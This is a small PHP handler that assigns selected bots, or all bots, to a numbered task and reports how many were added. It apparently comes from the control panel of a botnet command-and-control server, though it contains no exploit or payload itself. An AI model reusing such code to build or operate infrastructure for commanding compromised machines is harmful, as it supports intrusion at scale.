<?
	include_once "../common.php";
	include_once ROOT_PATH."/mod/tasks.php";
	include_once ROOT_PATH."/mod/functs.php";
	if( !$user->Check() ) exit;

	
	if( isset($_POST['task']) )
	{
		$task = (int)$_POST['task'];	if (!$task) die("<font class='error'>Data send error!</font>");
		$count = 0;		
		
		if( isset($_POST['bots']) && is_array($_POST['bots']) && count($_POST['bots']) ) 
		{
			$bots = $_POST['bots'];
			foreach($bots as $k=>$v) 
			{
				TaskAddBot($task, $k);
				$count++;
			}
		}
		else
		{
			$bots = GetAllBots();
			foreach($bots as $k=>$v) 
			{
				TaskAddBot($task, $v);
				$count++;
			}
		}
		
		echo "<font class='ok'>$count bots added to task #$task</font><hr color='#CCCCCC' size='1'>";
		include_once "show_tasks.php";
	}
	else die("<font class='error'>Data send error!</font>");
?>